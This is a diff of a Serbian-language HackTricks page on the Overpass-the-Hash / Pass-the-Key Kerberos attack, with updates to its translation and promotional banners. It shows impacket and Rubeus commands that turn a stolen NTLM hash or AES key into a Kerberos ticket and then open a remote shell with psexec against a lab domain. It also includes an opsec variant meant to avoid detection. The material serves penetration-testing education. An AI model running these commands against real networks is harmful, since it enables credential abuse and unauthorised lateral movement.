@@ -1,27 +1,30 @@
-# Pređi preko heša/Pređi ključem
+# Over Pass the Hash/Pass the Key
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 
-## Pređi preko heša/Pređi ključem (PTK)
+## Overpass The Hash/Pass The Key (PTK)
 
-Napad **Pređi preko heša/Pređi ključem (PTK)** je dizajniran za okruženja gde je tradicionalni NTLM protokol ograničen, a Kerberos autentikacija ima prioritet. Ovaj napad koristi NTLM heš ili AES ključeve korisnika kako bi dobio Kerberos tikete, omogućavajući neovlašćen pristup resursima unutar mreže.
+Napad **Overpass The Hash/Pass The Key (PTK)** je dizajniran za okruženja gde je tradicionalni NTLM protokol ograničen, a Kerberos autentifikacija ima prioritet. Ovaj napad koristi NTLM hash ili AES ključeve korisnika da bi zatražio Kerberos karte, omogućavajući neovlašćen pristup resursima unutar mreže.
 
-Za izvođenje ovog napada, početni korak uključuje dobijanje NTLM heša ili lozinke ciljanog korisničkog naloga. Nakon što se obezbedi ova informacija, može se dobiti Ticket Granting Ticket (TGT) za nalog, omogućavajući napadaču pristup servisima ili mašinama do kojih korisnik ima dozvole.
+Da bi se izvršio ovaj napad, prvi korak uključuje sticanje NTLM hasha ili lozinke ciljanog korisničkog naloga. Nakon obezbeđivanja ovih informacija, može se dobiti Ticket Granting Ticket (TGT) za nalog, što napadaču omogućava pristup uslugama ili mašinama kojima korisnik ima dozvole.
 
 Proces se može pokrenuti sledećim komandama:
 ```bash
@@ -29,18 +32,18 @@ python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-Za scenarije koji zahtevaju AES256, opcija `-aesKey [AES ključ]` može se koristiti. Osim toga, dobijeni tiket može se koristiti sa različitim alatima, uključujući smbexec.py ili wmiexec.py, proširujući opseg napada.
+Za scenarije koji zahtevaju AES256, opcija `-aesKey [AES key]` može se koristiti. Pored toga, dobijena karta može se koristiti sa raznim alatima, uključujući smbexec.py ili wmiexec.py, proširujući opseg napada.
 
-Nailaženje na probleme poput _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešava ažuriranjem Impacket biblioteke ili korišćenjem imena računara umesto IP adrese, obezbeđujući kompatibilnost sa Kerberos KDC.
+Problemi kao što su _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešavaju ažuriranjem Impacket biblioteke ili korišćenjem imena hosta umesto IP adrese, osiguravajući kompatibilnost sa Kerberos KDC.
 
-Alternativni niz komandi korišćenjem Rubeus.exe prikazuje drugu stranu ove tehnike:
+Alternativna komanda koristeći Rubeus.exe demonstrira još jedan aspekt ove tehnike:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-Ova metoda odražava pristup **Pass the Key**, sa fokusom na preuzimanju i korišćenju tiketa direktno u svrhu autentikacije. Ključno je napomenuti da inicijacija zahteva za TGT pokreće događaj `4768: Zahtevan je Kerberos autentikacioni tiket (TGT)`, što označava korišćenje RC4-HMAC podrazumevano, iako moderni Windows sistemi preferiraju AES256.
+Ova metoda odražava pristup **Pass the Key**, sa fokusom na preuzimanje i korišćenje karte direktno u svrhe autentifikacije. Važno je napomenuti da pokretanje zahteva za TGT aktivira događaj `4768: A Kerberos authentication ticket (TGT) was requested`, što označava korišćenje RC4-HMAC po defaultu, iako moderni Windows sistemi preferiraju AES256.
 
-Da bi se uskladili sa operativnom sigurnošću i koristili AES256, može se primeniti sledeća komanda:
+Da bi se pridržavali operativne sigurnosti i koristili AES256, može se primeniti sledeća komanda:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
@@ -52,14 +55,17 @@ Da bi se uskladili sa operativnom sigurnošću i koristili AES256, može se prim
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
